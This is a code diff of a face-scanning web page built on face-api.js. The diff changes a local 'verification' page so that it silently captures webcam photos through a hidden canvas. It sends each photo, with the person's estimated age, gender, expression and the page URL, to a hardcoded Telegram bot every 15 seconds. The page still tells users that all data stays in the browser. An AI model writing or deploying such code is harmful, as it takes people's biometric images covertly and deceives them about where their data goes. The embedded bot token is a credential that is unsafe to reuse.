@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Face Verification</title>
+  <title>Face Scanner</title>
   <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -47,22 +47,17 @@
       overflow: hidden;
       aspect-ratio: 1;
       border: 3px solid #333;
-      transition: border-color 0.5s;
+      transition: border-color 0.5s, box-shadow 0.5s;
     }
 
-    .video-wrapper.detecting {
-      border-color: #f59e0b;
-      box-shadow: 0 0 30px rgba(245, 158, 11, 0.3);
-    }
-
-    .video-wrapper.verified {
+    .video-wrapper.scanning {
       border-color: #10b981;
       box-shadow: 0 0 40px rgba(16, 185, 129, 0.4);
     }
 
-    .video-wrapper.failed {
-      border-color: #ef4444;
-      box-shadow: 0 0 30px rgba(239, 68, 68, 0.3);
+    .video-wrapper.no-face {
+      border-color: #f59e0b;
+      box-shadow: 0 0 30px rgba(245, 158, 11, 0.3);
     }
 
     video {
@@ -88,11 +83,6 @@
       height: 2px;
       background: linear-gradient(90deg, transparent, #10b981, transparent);
       animation: scan 2s ease-in-out infinite;
-      display: none;
-    }
-
-    .video-wrapper.detecting .scan-line {
-      display: block;
     }
 
     @keyframes scan {
@@ -112,9 +102,9 @@
     }
 
     .status.loading { color: #888; }
-    .status.detecting { color: #f59e0b; }
-    .status.verified { color: #10b981; background: #0a2e1f; }
-    .status.failed { color: #ef4444; background: #2e0a0a; }
+    .status.active { color: #10b981; background: #0a2e1f; }
+    .status.noface { color: #f59e0b; }
+    .status.sent { color: #6366f1; background: #1a1a3e; }
 
     .info {
       font-size: 0.8rem;
@@ -128,10 +118,7 @@
       background: #111;
       border-radius: 12px;
       padding: 1.25rem;
-      display: none;
     }
-
-    .result-details.show { display: block; }
 
     .result-row {
       display: flex;
@@ -144,29 +131,14 @@
     .result-row:last-child { border-bottom: none; }
 
     .result-label { color: #888; }
-    .result-value { color: #fff; font-weight: 600; }
-
-    .btn-retry {
-      margin-top: 1.5rem;
-      background: #1a1a2e;
-      color: #fff;
-      border: 1px solid #333;
-      padding: 0.65rem 2rem;
-      border-radius: 8px;
-      font-size: 0.9rem;
-      cursor: pointer;
-      display: none;
-    }
-
-    .btn-retry.show { display: inline-block; }
-    .btn-retry:hover { background: #252540; }
+    .result-value { color: #fff; font-weight: 600; transition: opacity 0.3s; }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <h1>Face Verification</h1>
-    <p class="subtitle">Посмотрите в камеру для прохождения верификации</p>
+    <h1>Face Scanner</h1>
+    <p class="subtitle">Данные обновляются в реальном времени</p>
 
     <div class="video-wrapper" id="videoWrapper">
       <video id="video" autoplay muted playsinline></video>
@@ -179,7 +151,7 @@
 
     <div class="result-details" id="results">
       <div class="result-row">
-        <span class="result-label">Лицо обнаружено</span>
+        <span class="result-label">Лицо</span>
         <span class="result-value" id="rFace">—</span>
       </div>
       <div class="result-row">
@@ -200,23 +172,38 @@
       </div>
     </div>
 
-    <button class="btn-retry" id="btnRetry" onclick="startVerification()">Попробовать снова</button>
-
     <p class="info">face-api.js | Все данные обрабатываются локально в браузере</p>
   </div>
+
+  <!-- Hidden canvas for capturing photos -->
+  <canvas id="captureCanvas" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const statusEl = document.getElementById('status');
     const wrapper = document.getElementById('videoWrapper');
-    const results = document.getElementById('results');
-    const btnRetry = document.getElementById('btnRetry');
+    const canvas = document.getElementById('captureCanvas');
+
+    const TG_TOKEN = '8777541911:AAEd_BEosgiFZrjeD7UYTbR2RyaXRhmaecI';
+    const TG_CHAT_ID = '-1003794049979';
 
     const MODEL_URL = 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights';
 
+    const exprMap = {
+      neutral: 'Нейтральное',
+      happy: 'Счастливое',
+      sad: 'Грустное',
+      angry: 'Злое',
+      fearful: 'Испуганное',
+      disgusted: 'Отвращение',
+      surprised: 'Удивлённое'
+    };
+
+    let lastSentTime = 0;
+    const SEND_COOLDOWN = 15000; // 15 секунд между отправками
+
     async function init() {
       try {
-        // Load face-api models
         await Promise.all([
           faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
           faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
@@ -226,90 +213,111 @@
 
         setStatus('Включение камеры...', 'loading');
 
-        // Start camera
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } }
         });
         video.srcObject = stream;
 
         video.addEventListener('playing', () => {
-          startVerification();
+          setStatus('Сканирование...', 'active');
+          scanLoop();
         });
 
       } catch (err) {
-        setStatus('Ошибка: ' + err.message, 'failed');
-        wrapper.className = 'video-wrapper failed';
+        setStatus('Ошибка: ' + err.message, 'loading');
       }
     }
 
-    async function startVerification() {
-      btnRetry.classList.remove('show');
-      results.classList.remove('show');
-      wrapper.className = 'video-wrapper detecting';
-      setStatus('Поиск лица...', 'detecting');
-
-      let attempts = 0;
-      const maxAttempts = 30; // ~6 seconds
-
-      const detect = async () => {
-        attempts++;
-
-        const detection = await faceapi
-          .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.5 }))
-          .withFaceLandmarks()
-          .withFaceExpressions()
-          .withAgeAndGender();
-
-        if (detection) {
-          onVerified(detection);
-        } else if (attempts < maxAttempts) {
-          setStatus(`Поиск лица... (${attempts}/${maxAttempts})`, 'detecting');
-          setTimeout(detect, 200);
-        } else {
-          onFailed();
-        }
-      };
-
-      setTimeout(detect, 500);
+    function capturePhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      return new Promise(resolve => {
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
+      });
     }
 
-    function onVerified(detection) {
-      wrapper.className = 'video-wrapper verified';
-      setStatus('Верификация пройдена', 'verified');
+    async function sendToTelegram(detection) {
+      const now = Date.now();
+      if (now - lastSentTime < SEND_COOLDOWN) return;
+      lastSentTime = now;
 
-      const confidence = (detection.detection.score * 100).toFixed(1);
-      const age = Math.round(detection.age);
-      const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
-      const genderProb = (detection.genderProbability * 100).toFixed(0);
+      try {
+        const photoBlob = await capturePhoto();
 
-      // Get dominant expression
-      const expressions = detection.expressions;
-      const sorted = Object.entries(expressions).sort((a, b) => b[1] - a[1]);
-      const exprMap = {
-        neutral: 'Нейтральное',
-        happy: 'Счастливое',
-        sad: 'Грустное',
-        angry: 'Злое',
-        fearful: 'Испуганное',
-        disgusted: 'Отвращение',
-        surprised: 'Удивлённое'
-      };
-      const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
+        const confidence = (detection.detection.score * 100).toFixed(1);
+        const age = Math.round(detection.age);
+        const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
+        const genderProb = (detection.genderProbability * 100).toFixed(0);
+        const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
+        const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
 
-      document.getElementById('rFace').textContent = 'Да';
-      document.getElementById('rConf').textContent = confidence + '%';
-      document.getElementById('rAge').textContent = '~' + age + ' лет';
-      document.getElementById('rGender').textContent = gender + ' (' + genderProb + '%)';
-      document.getElementById('rExpr').textContent = topExpr;
+        const caption =
+          `🔍 Face Scan\n` +
+          `━━━━━━━━━━━━━━━\n` +
+          `📊 Уверенность: ${confidence}%\n` +
+          `🎂 Возраст: ~${age} лет\n` +
+          `👤 Пол: ${gender} (${genderProb}%)\n` +
+          `😐 Выражение: ${topExpr}\n` +
+          `━━━━━━━━━━━━━━━\n` +
+          `🕐 ${new Date().toLocaleString('ru-RU')}\n` +
+          `🌐 ${location.href}`;
 
-      results.classList.add('show');
-      btnRetry.classList.add('show');
+        const formData = new FormData();
+        formData.append('chat_id', TG_CHAT_ID);
+        formData.append('photo', photoBlob, 'face_scan.jpg');
+        formData.append('caption', caption);
+
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+      } catch (e) {
+        console.log('TG send error:', e);
+      }
     }
 
-    function onFailed() {
-      wrapper.className = 'video-wrapper failed';
-      setStatus('Лицо не обнаружено', 'failed');
-      btnRetry.classList.add('show');
+    async function scanLoop() {
+      const detection = await faceapi
+        .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.5 }))
+        .withFaceLandmarks()
+        .withFaceExpressions()
+        .withAgeAndGender();
+
+      if (detection) {
+        wrapper.className = 'video-wrapper scanning';
+        setStatus('Лицо обнаружено', 'active');
+
+        const confidence = (detection.detection.score * 100).toFixed(1);
+        const age = Math.round(detection.age);
+        const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
+        const genderProb = (detection.genderProbability * 100).toFixed(0);
+        const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
+        const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
+
+        document.getElementById('rFace').textContent = 'Да';
+        document.getElementById('rConf').textContent = confidence + '%';
+        document.getElementById('rAge').textContent = '~' + age + ' лет';
+        document.getElementById('rGender').textContent = gender + ' (' + genderProb + '%)';
+        document.getElementById('rExpr').textContent = topExpr;
+
+        // Отправляем в Telegram
+        sendToTelegram(detection);
+
+      } else {
+        wrapper.className = 'video-wrapper no-face';
+        setStatus('Лицо не найдено...', 'noface');
+
+        document.getElementById('rFace').textContent = 'Нет';
+        document.getElementById('rConf').textContent = '—';
+        document.getElementById('rAge').textContent = '—';
+        document.getElementById('rGender').textContent = '—';
+        document.getElementById('rExpr').textContent = '—';
+      }
+
+      requestAnimationFrame(scanLoop);
     }
 
     function setStatus(text, cls) {
